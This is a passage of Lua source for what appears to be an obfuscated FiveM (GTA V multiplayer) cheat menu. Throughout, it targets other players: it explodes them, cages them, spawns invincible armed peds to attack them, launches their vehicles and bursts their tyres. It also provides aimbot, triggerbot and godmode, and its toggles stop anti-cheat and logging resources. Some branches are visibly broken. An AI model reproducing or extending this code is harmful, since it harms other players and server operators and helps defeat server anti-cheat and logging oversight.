                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)

            elseif RPPPwdjwdU23.Button("~r~Spawn A ~b~Shark",false,0.385,0.34) then
                nukesSpawnPed("a_c_sharktiger")
            elseif RPPPwdjwdU23.Button("~r~Spawn A ~b~Robot Man",false,0.385,0.34) then
                nukesSpawnPed("u_m_y_juggernaut_01")
            elseif RPPPwdjwdU23.Button("~r~Spawn A ~y~Angry Monkey",false,0.385,0.42) then
                nukesSpawnPed("a_c_chimp")



            elseif RPPPwdjwdU23.Button('~b~FULL Armour ~s~Player') then
                local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                for i = 0, 99 do
                    Citizen.Wait(0)
                    CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
                    SetPickupRegenerationTime(pickup, 10)
                    i = i + 1
                end
            elseif RPPPwdjwdU23.ComboBox("~r~RedBoy ~p~Party ~y~v3.0>", {"~p~Attach~s~FBI bulding", "~p~Attach ~s~Maze bank", "~p~Attach ~s~bulding", "~b~Attach ~s~Airplane", "~b~Attach ~s~Weapons", "~b~Attach ~s~Tube", "~b~Attach ~s~Something Random", "~b~Attach ~s~Ferris Wheel", "~b~Attach ~s~Bumper Car", "K??mpe b??d"}, currPFuncIndex, selPFuncIndex, function(currentIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                end) then
                    if selPFuncIndex == 1 then
                        local hamburg = "dt1_05_fbi_colplug"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 2 then
                        local hamburg = "dt1_11_dt1_tower_lod"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 3 then
                        local hamburg = "dt1_02_slod"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 4 then
                        local hamburg = "prop_med_jet_01"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 5 then
                        local hamburg = "v_ilev_gc_weapons"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 6 then
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 7 then
                        local hamburg = "prop_temp_carrier"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 8 then
                        local hamburg = "p_ferris_wheel_amo_l2"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    elseif selPFuncIndex == 8 then
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        local pickup = CreateObject(GetHashKey('prop_bumper_car_01'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('prop_bumper_car_01'), 1, 0)
                        SetPickupRegenerationTime(pickup, 60)
                    elseif selPFuncIndex == 9 then
                        local hamburg = "prop_temp_carrier"
                        local hamburghash = GetHashKey(hamburg)
                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                    end
            elseif RPPPwdjwdU23.Button('~r~Cage ~s~Player') then
                ShowInfo("~y~Cage Player...")
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
                local e7 = 'prop_fnclink_05crnr1'
                local e8 = GetHashKey(e7)
                RequestModel(e8)
                while not HasModelLoaded(e8) do
                    Citizen.Wait(0)
                end






                local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                SetEntityHeading(e9, -90.0)
                SetEntityHeading(ea, 90.0)
                FreezeEntityPosition(e9, true)
                FreezeEntityPosition(ea, true)
            elseif RPPPwdjwdU23.Button("~r~Spawn ~s~Swat army with ~y~AK") then
                local bQ = "s_m_y_swat_01"
                local bR = "WEAPON_ASSAULTRIFLE"
                for i = 0, 10 do
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    RequestModel(GetHashKey(bQ))
                    Citizen.Wait(50)
                    if HasModelLoaded(GetHashKey(bQ)) then
                        local ped =
                            CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                            CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                        NetworkRegisterEntityAsNetworked(ped)
                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                            local ei = PedToNet(ped)
                            NetworkSetNetworkIdDynamic(ei, false)
                            SetNetworkIdCanMigrate(ei, true)
                            SetNetworkIdExistsOnAllMachines(ei, true)
                            Citizen.Wait(50)
                            NetToPed(ei)
                            GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                            SetEntityInvincible(ped, true)
                            SetPedCanSwitchWeapon(ped, true)
                            TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                        elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                            TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                        else
                            Citizen.Wait(0)
                        end
                    end
                end
        elseif RPPPwdjwdU23.Button("~r~Spawn ~s~Stripper army with ~y~RGQ") then
                local bQ = "csb_stripper_02"
                local bR = "weapon_rpg"
                for i = 0, 10 do
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    RequestModel(GetHashKey(bQ))
                    Citizen.Wait(50)
                    if HasModelLoaded(GetHashKey(bQ)) then
                        local ped =
                            CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
                        NetworkRegisterEntityAsNetworked(ped)
                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                            local ei = PedToNet(ped)
                            NetworkSetNetworkIdDynamic(ei, false)
                            SetNetworkIdCanMigrate(ei, true)
                            SetNetworkIdExistsOnAllMachines(ei, true)
                            Citizen.Wait(50)
                            NetToPed(ei)
                            GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                            SetEntityInvincible(ped, true)
                            SetPedCanSwitchWeapon(ped, true)
                            TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                        elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                            TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                        else
                            Citizen.Wait(0)
                        end
                    end
                end
        elseif RPPPwdjwdU23.Button("Nearby Peds Attack Player") then
            PedAttack(selectedPlayer, PedAttackType)
        elseif RPPPwdjwdU23.Button("Explode Player") then
            ExplodePlayer(selectedPlayer)
        elseif RPPPwdjwdU23.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
            currAttackTypeIndex = currentIndex
            selAttackTypeIndex = currentIndex
            PedAttackType = currentIndex
        end) then
         elseif RPPPwdjwdU23.Button("Possess Player Vehicle") then
            if Spectating then SpectatePlayer(selectedPlayer) end
            PossessVehicle(selectedPlayer)
        elseif RPPPwdjwdU23.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
            Tracking = not Tracking
            TrackedPlayer = selectedPlayer
            elseif RPPPwdjwdU23.Button("Teleport To Player") then
				local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
				if string.lower(confirm) == "y" then
					TeleportToPlayer(selectedPlayer)
				else
					ShowInfo("~r~Operation Canceled")
				end
            elseif RPPPwdjwdU23.Button("Teleport To Player ~o~Fast") then
                TeleportToPlayer(selectedPlayer)
			elseif RPPPwdjwdU23.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selectedIndex)
                    currSeatIndex = currentIndex
                    selSeatIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
						local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
						if string.lower(confirm) == "y" then
							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
							if selSeatIndex == 1 then
								if IsVehicleSeatFree(veh, 0) then
									SetPedIntoVehicle(PlayerPedId(), veh, 0)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 2 then
								if IsVehicleSeatFree(veh, 1) then
									SetPedIntoVehicle(PlayerPedId(), veh, 1)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 3 then
								if IsVehicleSeatFree(veh, 2) then
									SetPedIntoVehicle(PlayerPedId(), veh, 2)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							end
						end
					end
			elseif RPPPwdjwdU23.ComboBox("Player Functions ~q~>~w~", {"Give Player Health", "Give Player Armor", "Cancel Anim/Task", "Explode Player", "Silent Kill Player"}, currSPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
                currSPFuncIndex = currentIndex
                selSPFuncIndex = currentIndex
                end) then
				if selSPFuncIndex == 1 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), coords, 0, 200, 0, '')
				elseif selSPFuncIndex == 2 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), coords, 0, 200, 0, '')
				elseif selSPFuncIndex == 3 then
					ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				elseif selSPFuncIndex == 4 then
					ExplodePlayer(selectedPlayer)
				elseif selSPFuncIndex == 5 then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				end
			elseif RPPPwdjwdU23.Button("Give Player Vehicle") then
                local veh = GetKeyboardInput("Enter Vehicle Model Name")
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				SpawnVehAtCoords(veh, coords)
            elseif RPPPwdjwdU23.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
                Tracking = not Tracking
                TrackedPlayer = selectedPlayer
			elseif RPPPwdjwdU23.Button("Launch Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")		
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
            elseif RPPPwdjwdU23.Button("hej hej") then
                hejhej(selectedPlayer)
			elseif RPPPwdjwdU23.Button("Slam Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif RPPPwdjwdU23.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selectedIndex)
                    currTireIndex = currentIndex
                    selTireIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
					
						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						if selTireIndex == 1 then
							SetVehicleTyreBurst(veh, 0, 1, 1000.0)
						elseif selTireIndex == 2 then
							SetVehicleTyreBurst(veh, 1, 1, 1000.0)
						elseif selTireIndex == 3 then
							SetVehicleTyreBurst(veh, 4, 1, 1000.0)
						elseif selTireIndex == 4 then
							SetVehicleTyreBurst(veh, 5, 1, 1000.0)
						elseif selTireIndex == 5 then
							for i=0,7 do
								SetVehicleTyreBurst(veh, i, 1, 1000.0)
							end
						end
						
						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
					end
            elseif RPPPwdjwdU23.Button("Nearby Peds Attack Player") then
                PedAttack(selectedPlayer, PedAttackType)
            elseif RPPPwdjwdU23.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
                currAttackTypeIndex = currentIndex
                selAttackTypeIndex = currentIndex
                PedAttackType = currentIndex
            end) then
            elseif RPPPwdjwdU23.Button("Give All Weapons") then
            GiveAllWeapons(selectedPlayer)
            elseif RPPPwdjwdU23.Button("Strip Weapons") then
                StripPlayer(selectedPlayer)
            elseif RPPPwdjwdU23.Button("Kick From Vehicle") then
                KickFromVeh(selectedPlayer)
            end
        









        
        -- SELF OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('self') then
            if RPPPwdjwdU23.CheckBox("GodMode", Godmode) then
                Godmode = not Godmode
                ToggleGodmode(Godmode)

			elseif RPPPwdjwdU23.ComboBox("Player Functions", {"Heal Player", "Give Player Armor", "Remove Player Armor", "Clean Player", "Suicide", "Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                end) then
				if selPFuncIndex == 1 then
					SetEntityHealth(PlayerPedId(), 200)
				elseif selPFuncIndex == 2 then
					SetPedArmour(PlayerPedId(), 100)
				elseif selPFuncIndex == 3 then
					SetPedArmour(PlayerPedId(), 0)
				elseif selPFuncIndex == 4 then
					ClearPedBloodDamage(PlayerPedId())
					ClearPedWetness(PlayerPedId())
					ClearPedEnvDirt(PlayerPedId())
					ResetPedVisibleDamage(PlayerPedId())
				elseif selPFuncIndex == 5 then
					SetEntityHealth(PlayerPedId(), 0)
				elseif selPFuncIndex == 6 then
					ClearPedTasksImmediately(PlayerPedId())
                end
            elseif RPPPwdjwdU23.CheckBox("Stop-Anti-Cheat", StopResource, AC, Chocohax, PolarisAC) then
                StopResource = not StopResource
            elseif RPPPwdjwdU23.CheckBox("Stop-logs", StopResource, modules, admin) then
                StopResource = not StopResource
            elseif RPPPwdjwdU23.CheckBox("Infinite Stamina", InfStamina) then
                InfStamina = not InfStamina
            elseif RPPPwdjwdU23.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selectedIndex)
                currFastRunIndex = currentIndex
                selFastRunIndex = currentIndex
                FastRunMultiplier = FastCB[currentIndex]
                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                end) then
			elseif RPPPwdjwdU23.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selectedIndex)
                currFastSwimIndex = currentIndex
                selFastSwimIndex = currentIndex
                FastSwimMultiplier = FastCB[currentIndex]
                SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                end) then
            elseif RPPPwdjwdU23.CheckBox("Super Jump", SuperJump) then
                SuperJump = not SuperJump
            elseif RPPPwdjwdU23.CheckBox("Invisibility", Invisibility) then
                Invisibility = not Invisibility
                if not Invisibility then
                    SetEntityVisible(PlayerPedId(), true)
                end
            elseif RPPPwdjwdU23.CheckBox("Magneto Mode", ForceTog) then
                ForceMod()
            elseif RPPPwdjwdU23.CheckBox("Forcefield", Forcefield) then
                Forcefield = not Forcefield
            elseif RPPPwdjwdU23.CheckBox("Noclip", Noclipping) then
                ToggleNoclip()
            elseif RPPPwdjwdU23.CheckBox("Never Wanted", NeverWanted) then
                NeverWanted = not NeverWanted
            end
        
        
        -- APPEARANCE MENU
        elseif RPPPwdjwdU23.IsMenuOpened('appearance') then
            if RPPPwdjwdU23.Button("Set Model") then
                local model = GetKeyboardInput("Enter Model Name:")
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized (Try Again)") end
            elseif RPPPwdjwdU23.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif RPPPwdjwdU23.Button("Randomize Clothing") then
                RandomClothes(PlayerId())
            elseif RPPPwdjwdU23.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif RPPPwdjwdU23.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                SetCurrentOutfit(Outfits[selClothingIndex])
            end


            elseif RPPPwdjwdU23.IsMenuOpened('modifyskintextures') then



                if RPPPwdjwdU23.MenuButton("Head", "modifyhead") then
				
					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
						RPPPwdjwdU23.CloseMenu()
						RPPPwdjwdU23.OpenMenu('modifyskintextures') 
						ShowInfo("~r~Only MP Models Supported For Now!") 
                    end
                    
					faceItemsList = GetHeadItems()
                    faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
                    hairItemsList = GetHairItems()
                    hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
					maskItemsList = GetMaskItems()
					hatItemsList = GetHatItems()
                    hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
				end
                
                -- Head Menu
                elseif RPPPwdjwdU23.IsMenuOpened('modifyhead') then
                    if RPPPwdjwdU23.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
                        currFaceIndex = currentIndex
                        selFaceIndex = currentIndex 
                        SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
						faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
						end) then

                    elseif RPPPwdjwdU23.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
                        previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        
                        previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

                        currHairIndex = currentIndex
                        selHairIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
                        currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
                        hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

                        if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
                            currHairTextureIndex = hairTexturesList[currentHairTexture]
                            selHairTextureIndex = hairTexturesList[currentHairTexture]
                        end

                        end) then
                    elseif RPPPwdjwdU23.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
                        currHairTextureIndex = currentIndex
                        selHairTextureIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
                        end) then
                    elseif RPPPwdjwdU23.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
                        currMaskIndex = currentIndex
                        selMaskIndex = currentIndex
                        SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
						end) then
                    elseif RPPPwdjwdU23.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
                        previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) 

                       
                        previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]


                        currHatIndex = currentIndex
                        selHatIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
                        currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) 
                        hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) 


                        if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then 
                            print('if condition')

                            

                            currHatTextureIndex = hatTexturesList[currentHatTexture]
                            selHatTextureIndex = hatTexturesList[currentHatTexture]
                        end

						end) then	
					elseif RPPPwdjwdU23.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
                        currHatTextureIndex = currentIndex
                        selHatTextureIndex = currentIndex
                        SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
						end) then
						
                    end


        -- MODIFIERS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('modifiers') then
            if RPPPwdjwdU23.ComboBox("Forcefield Radius", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
                    currForcefieldRadiusIndex = currentIndex
                    selForcefieldRadiusIndex = currentIndex
                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
                    end) then
            elseif RPPPwdjwdU23.ComboBox("Noclip Speed", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                    currNoclipSpeedIndex = currentIndex
                    selNoclipSpeedIndex = currentIndex
                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                    end) then
            end
        
        -- WEAPON OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('weapon') then
            if RPPPwdjwdU23.MenuButton("Give Weapon", 'weaponspawner') then
                selectedPlayer = PlayerId()
            elseif RPPPwdjwdU23.Button("Give All Weapons") then
                GiveAllWeapons(PlayerId())
            elseif RPPPwdjwdU23.Button("Remove weapons") then
                StripPlayer(PlayerId())
            elseif RPPPwdjwdU23.Button("Give Max Ammo") then
                GiveMaxAmmo(PlayerId())
            elseif RPPPwdjwdU23.CheckBox("Infinite Ammo", InfAmmo) then
                InfAmmo = not InfAmmo
                SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
            elseif RPPPwdjwdU23.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                ExplosiveAmmo = not ExplosiveAmmo
            elseif RPPPwdjwdU23.CheckBox("Force Gun", ForceGun) then
                ForceGun = not ForceGun
            elseif RPPPwdjwdU23.CheckBox("Super Damage", SuperDamage) then
                SuperDamage = not SuperDamage
                if SuperDamage then
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
                else
                    local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                end
            elseif RPPPwdjwdU23.CheckBox("Rapid Fire", RapidFire) then
                RapidFire = not RapidFire
            elseif RPPPwdjwdU23.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif RPPPwdjwdU23.ComboBox("Aimbot Bone Target", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
                currAimbotBoneIndex = currentIndex
                selAimbotBoneIndex = currentIndex
                AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
            end) then
                elseif RPPPwdjwdU23.CheckBox("Draw Aimbot FOV", DrawFov) then
                DrawFov = not DrawFov
                elseif RPPPwdjwdU23.CheckBox("Triggerbot", Triggerbot) then
                    Triggerbot = not Triggerbot
                elseif RPPPwdjwdU23.CheckBox("~r~Ragebot", Ragebot) then
                    Ragebot = not Ragebot
                end
        
        



                -- vidjiwadhu8dwagyu89dwahui gun
            elseif RPPPwdjwdU23.IsMenuOpened("bulletgunmenu") then
                if RPPPwdjwdU23.CheckBox("Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                        vehicleGun = enabled
                    end)
                then
                elseif RPPPwdjwdU23.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif RPPPwdjwdU23.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    currentVehicleSpeed = currentIndex
                    selectedVehicleSpeed = selectedIndex
                end)
                then
                elseif RPPPwdjwdU23.CheckBox(
                    "Bullet Gun",
                    bulletGun,
                    function(enabled)
                        bulletGun = enabled
                    end)
                then
                elseif RPPPwdjwdU23.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                    currentBullet = currentIndex
                    selectedBullet = selectedIndex
                    end)
                then
                end





        -- SPECIFIC WEAPON MENU
        elseif RPPPwdjwdU23.IsMenuOpened('weaponspawner') then
            if RPPPwdjwdU23.MenuButton('weaponcustomization', 'cust') then
            elseif RPPPwdjwdU23.MenuButton('Melee Weapons', 'melee') then
            elseif RPPPwdjwdU23.MenuButton('Pistols', 'pistol') then
            elseif RPPPwdjwdU23.MenuButton('SMGs / MGs', 'smg') then
            elseif RPPPwdjwdU23.MenuButton('Shotguns', 'shotgun') then
            elseif RPPPwdjwdU23.MenuButton('Assault Rifles', 'assault') then
            elseif RPPPwdjwdU23.MenuButton('Sniper Rifles', 'sniper') then
            elseif RPPPwdjwdU23.MenuButton('Thrown Weapons', 'thrown') then
            elseif RPPPwdjwdU23.MenuButton('Heavy Weapons', 'heavy') then
			end

        elseif RPPPwdjwdU23.IsMenuOpened('cust') then
            if RPPPwdjwdU23.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
            currPFuncIndex = currentIndex
            selPFuncIndex = currentIndex
              end) then
            if selPFuncIndex == 1 then
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)

            elseif selPFuncIndex == 2 then
